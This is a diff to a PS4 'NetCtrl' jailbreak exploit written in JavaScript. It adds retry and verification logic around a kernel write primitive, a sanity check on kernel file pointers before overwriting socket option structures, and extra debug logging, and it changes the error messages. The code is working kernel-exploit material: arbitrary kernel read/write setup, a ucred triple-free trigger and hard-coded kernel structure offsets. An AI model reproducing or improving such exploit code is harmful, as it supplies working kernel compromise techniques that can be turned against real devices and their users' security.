@@ -9,7 +9,6 @@ if (typeof libc_addr === 'undefined') {
   include('userland.js')
 }
 include('kernel.js')
-include('stats-tracker.js')
 include('binloader.js')
 if (!String.prototype.padStart) {
   String.prototype.padStart = function padStart (targetLength, padString) {
@@ -628,6 +627,7 @@ function wait_uio_writev () {
 function init () {
   log('=== PS4 NetCtrl Jailbreak ===')
   log('build: %VERSION_STRING%')
+  log('tag: %VERSION_TAG%')
 
   FW_VERSION = get_fwversion()
   log('Detected PS4 firmware: ' + FW_VERSION)
@@ -1077,11 +1077,30 @@ function setup_arbitrary_rw () {
   write32(master_pipe_buf.add(0x0C), PAGE_SIZE)        // size
   write64(master_pipe_buf.add(0x10), victim_r_pipe_data)  // buffer
 
-  const ret_write = kwriteslow(master_r_pipe_data, master_pipe_buf, PIPEBUF_SIZE)
+  var ret_write = kwriteslow(master_r_pipe_data, master_pipe_buf, PIPEBUF_SIZE)
 
   if (ret_write.eq(BigInt_Error)) {
     cleanup()
-    throw new Error('Netctrl failed - Reboot and try again')
+    throw new Error('Netctrl failed - Shutdown and try again')
+  }
+
+  // Test if kwriteslow worked as expected or try again
+  var kws_success = 0
+  for (var i = 0; i < 3; i++) {
+    if (kread64(master_r_pipe_data.add(0x10)).eq(victim_r_pipe_data)) {
+      kws_success = 1
+      break
+    }
+    debug('kwriteslow did not work - Trying again')
+    ret_write = kwriteslow(master_r_pipe_data, master_pipe_buf, PIPEBUF_SIZE)
+    if (ret_write.eq(BigInt_Error)) {
+      cleanup()
+      throw new Error('Netctrl failed - Shutdown and try again')
+    }
+  }
+
+  if (kws_success === 0) {
+    throw new Error('Netctrl failed - Shutdown and try again')
   }
 
   // Increase reference counts for the pipes.
@@ -1192,7 +1211,9 @@ function fhold (fp: BigInt) {
 }
 
 function fget (fd: number) {
-  return kread64(fdt_ofiles.add(fd * FILEDESCENT_SIZE))
+  var f = kread64(fdt_ofiles.add(fd * FILEDESCENT_SIZE))
+  debug('Returning fget: ' + hex(f) + ' for fd: ' + fd)
+  return f
 }
 
 function remove_rthr_from_socket (fd: number) {
@@ -1200,10 +1221,14 @@ function remove_rthr_from_socket (fd: number) {
   // At this point we don't care about twins/triplets
   if (fd > 0) {
     const fp = fget(fd)
-    const f_data = kread64(fp.add(0x00))
-    const so_pcb = kread64(f_data.add(0x18))
-    const in6p_outputopts = kread64(so_pcb.add(0x118))
-    kwrite64(in6p_outputopts.add(0x68), new BigInt(0)) // ip6po_rhi_rthdr
+    if (fp.gt(new BigInt(0xFFFF0000, 0x0))) {
+      const f_data = kread64(fp.add(0x00))
+      const so_pcb = kread64(f_data.add(0x18))
+      const in6p_outputopts = kread64(so_pcb.add(0x118))
+      kwrite64(in6p_outputopts.add(0x68), new BigInt(0)) // ip6po_rhi_rthdr
+    } else {
+      debug('Skipped wrong fp: ' + hex(fp) + ' for fd: ' + fd)
+    }
   }
 }
 
@@ -1369,7 +1394,7 @@ function trigger_ucred_triplefree () {
 
     if (!end) {
       if (cleanup_called) {
-        throw new Error('Netctrl failed - Reboot and try again')
+        throw new Error('Netctrl failed - Shutdown and try again')
       }
       // Clean up and start again
       close(new BigInt(uaf_socket))
@@ -1524,7 +1549,7 @@ function kreadslow64 (address: BigInt) {
   // debug("Buffer from kreadslow: " + hex(buffer));
   if (buffer.eq(BigInt_Error)) {
     cleanup()
-    throw new Error('Netctrl failed - Reboot and try again')
+    throw new Error('Netctrl failed - Shutdown and try again')
   }
   return read64(buffer)
 }
